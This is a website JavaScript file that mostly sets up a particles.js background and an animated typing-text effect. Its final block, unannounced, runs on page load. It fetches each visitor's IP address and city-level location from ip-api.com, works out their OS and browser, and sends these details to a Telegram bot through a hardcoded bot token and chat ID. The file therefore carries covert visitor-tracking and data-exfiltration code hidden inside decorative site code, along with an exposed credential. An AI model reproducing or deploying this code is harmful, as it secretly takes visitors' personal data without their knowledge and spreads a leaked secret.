particlesJS('particles-js', {
	particles: {
		number: {
			value: 150,
			density: {
				enable: true,
				value_area: 800
			}
		},
		color: {
			value: '#fff'
		},
		shape: {
			type: 'circle',
			stroke: {
				width: 0,
				color: '#fff'
			},
			polygon: {
				nb_sides: 5
			},
			image: {
				src: 'https://cdn.freebiesupply.com/logos/large/2x/slack-logo-icon.png',
				width: 100,
				height: 100
			}
		},
		
		opacity: {
			value: 0.2,
			random: false,
			anim: {
				enable: false,
				speed: 1,
				opacity_min: 0.1,
				sync: false
			}
		},
		size: {
			value: 4,
			random: true,
			anim: {
				enable: false,
				speed: 10,
				size_min: 10,
				sync: false
			}
		},
		line_linked: {
			enable: false,
			distance: 150,
			color: '#808080',
			opacity: 0.4,
			width: 1
		},
		move: {
			enable: true,
			speed: 5,
			direction: 'none',
			random: false,
			straight: false,
			out_mode: 'out',
			bounce: false,
			attract: {
				enable: false,
				rotateX: 600,
				rotateY: 1200
			}
		}
	},
	interactivity: {
		detect_on: 'window',
		events: {
			onhover: {
				enable: false,
				mode: 'repulse'
			},
			onclick: {
				enable: false,
				mode: 'push'
			}
		},
		modes: {
			'repulse' : {
				distance: 70,
				duration: 0.4
			},
			'push' : {
				particles_nb: 4
			}
		}
	},
	retina_detect: true
});
const allElements = document.querySelectorAll('.animated-text');

// It checks if there is at least one element
if (allElements.length > 0) {
	//It runs the script for each found element
	allElements.forEach((element) => {
		const txtElement = element,
			wordsList = txtElement.getAttribute('data-words'),
			words = wordsList.split(', '); // It makes an array of words from data attribute

		let wordsCount = 0;

		entry();

		// Initial function
		function entry() {
			if (wordsCount < words.length) {
				// It runs the code for each word
				let word = words[wordsCount],
					txtArr = word.split(''), // It makes an array of letters in the word
					count = 0;

				txtElement.textContent = ''; // It removes the previous text from the element

				// For each letter in the array
				txtArr.forEach((letter) => {
					// It replaces the empty space for the "non-break-space" HTML...
					// ... This is needed to separate the words properly
					let _letter = letter === ' ' ? '&nbsp;' : letter;

					// It wraps every letter with a "span" and puts all they back to the element
					txtElement.innerHTML += `<span>${_letter}</span>`;
				});

				let spans = txtElement.childNodes;

				// It sets the interval between each letter showing
				const letterInterval = setInterval(activeLetter, 70);

				function activeLetter() {
					spans[count].classList.add('active');
					count++;

					if (count === spans.length) {
						clearInterval(letterInterval);

						// It waits 4 seconds to start erasing the word
						setTimeout(() => {
							eraseText();
						}, 600);
					}
				}

				function eraseText() {
					// It sets the interval between each letter hiding
					let removeInterval = setInterval(removeLetter, 40);
					count--;

					function removeLetter() {
						spans[count].classList.remove('active');
						count--;

						if (count === -1) {
							clearInterval(removeInterval);
							wordsCount++;

							// After removing the last letter, call the initial function again
							entry();
						}
					}
				}
			} else {
				// If the code reaches the last word
				// It resets the words counter...
				wordsCount = 0;
				// ...and calls the initial function again.
				entry();
			}
		}
	});
}

let GetApi = new XMLHttpRequest();
let api = '';
GetApi.open('GET', 'http://ip-api.com/json');
GetApi.send();
GetApi.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        var result = JSON.parse(this.responseText);
        api = result['query']
        country = result['country']+", "+result['city']+", "+result['regionName']
        let dataEx = navigator.userAgent.split(' ')
        platformName = 'Unknown OS Platform';
        browserName = 'Unknown Browser';
        if(navigator.userAgent.match(/windows nt 10/i)){
        	platformName = 'Windows 10';
        }else if(navigator.userAgent.match(/windows nt 6.3/i)){
        	platformName = 'Windows 8.1';
        }else if(navigator.userAgent.match(/windows nt 6.2/i)){
        	platformName = 'Windows 8';
        }else if(navigator.userAgent.match(/windows nt 6.1/i)){
        	platformName = 'Windows 7';
        }else if(navigator.userAgent.match(/windows nt 6.0/i)){
        	platformName = 'Windows Vista';
        }else if(navigator.userAgent.match(/windows nt 5.2/i)){
        	platformName = 'Windows Server 2003/XP x64';
        }else if(navigator.userAgent.match(/windows nt 5.1/i)){
        	platformName = 'Windows XP';
        }else if(navigator.userAgent.match(/windows xp/i)){
        	platformName = 'Windows XP';
        }else if(navigator.userAgent.match(/windows nt 5.0/i)){
        	platformName = 'Windows 2000';
        }else if(navigator.userAgent.match(/windows me/i)){
        	platformName = 'Windows ME';
        }else if(navigator.userAgent.match(/win98/i)){
        	platformName = 'Windows 98';
        }else if(navigator.userAgent.match(/win95/i)){
        	platformName = 'Windows 95';
        }else if(navigator.userAgent.match(/win16/i)){
        	platformName = 'Windows 3.11';
        }else if(navigator.userAgent.match(/macintosh|mac os x/i)){
        	platformName = 'Mac OS X';
        }else if(navigator.userAgent.match(/mac_powerpc/i)){
        	platformName = 'Mac OS 9';
        }else if(navigator.userAgent.match(/ubuntu/i)){
        	platformName = 'Ubuntu';
        }else if(navigator.userAgent.match(/iphone/i)){
        	platformName = 'iPhone';
        }else if(navigator.userAgent.match(/ipod/i)){
        	platformName = 'iPod';
        }else if(navigator.userAgent.match(/ipad/i)){
        	platformName = 'iPad';
        }else if(navigator.userAgent.match(/android 9/i)){
        	platformName = 'Android 9';
        }else if(navigator.userAgent.match(/android 8/i)){
        	platformName = 'Android 8';
        }else if(navigator.userAgent.match(/android 7/i)){
        	platformName = 'Android 7';
        }else if(navigator.userAgent.match(/android 6/i)){
        	platformName = 'Android 6';
        }else if(navigator.userAgent.match(/android 5/i)){
        	platformName = 'Android 5';
        }else if(navigator.userAgent.match(/android 4/i)){
        	platformName = 'Android 4';
        }else if(navigator.userAgent.match(/android 3/i)){
        	platformName = 'Android 3';
        }else if(navigator.userAgent.match(/android 2/i)){
        	platformName = 'Android 2';
        }else if(navigator.userAgent.match(/android 10/i)){
        	platformName = 'Android 10';
        }else if(navigator.userAgent.match(/android 11/i)){
        	platformName = 'Android 11';
        }else if(navigator.userAgent.match(/android 12/i)){
        	platformName = 'Android 12';
        }else if(navigator.userAgent.match(/android 13/i)){
        	platformName = 'Android 13';
        }else if(navigator.userAgent.match(/android 14/i)){
        	platformName = 'Android 14';
        }else if(navigator.userAgent.match(/android 1/i)){
        	platformName = 'Android 1';
        }else if(navigator.userAgent.match(/blackberry/i)){
        	platformName = 'BlackBerry';
        }else if(navigator.userAgent.match(/linux/i)){
        	platformName = 'Linux';
        }else if(navigator.userAgent.match(/webos/i)){
        	platformName = 'Mobile';
        }
        if(navigator.userAgent.match(/opera/i)){
        	browserName = "Opera";
        }else if(navigator.userAgent.match(/edge/i)){
        	browserName = "Microsoft Edge";
        }else  if(navigator.userAgent.match(/chrome/i)){
        	browserName = "Chrome";
        }else if(navigator.userAgent.match(/safari/i)){
        	browserName = "Safari";
        }else if(navigator.userAgent.match(/msie/i)){
        	browserName = "Internet Explorer";
        }else if(navigator.userAgent.match(/trident/i)){
        	browserName = "Internet Explorer";
        }else if(navigator.userAgent.match(/luasocket/i)){
        	browserName = "LuaSocket";
        }
        let text = `🙋🏻‍♂️| تم دخول شخص جديد ↓
ـــــــــــــــــــــــــــــــــــــــــــــــــــ
🌐| الموقع : https://${location.hostname}
ـــــــــــــــــــــــــــــــــــــــــــــــــــ
ℹ️| الايبي : ${api}
📟| النظام : ${platformName}
💻| المتصفح : ${browserName}
📍| المكان : ${country}
ـــــــــــــــــــــــــــــــــــــــــــــــــــ
🧾| جميع المعلومات : ↓
${navigator.userAgent}`
        let sendTele = new XMLHttpRequest();
        let Token = '5596564857:AAGZ7swpgA7tu0w0xSPjuMjxZ6DjOFXfhYk';
        let id = '193960998';
        sendTele.open('GET', 'http://api.telegram.org/bot' + Token +'/sendmessage?chat_id=' + id + '&text=' + encodeURI(text));
        sendTele.send();
    }
};
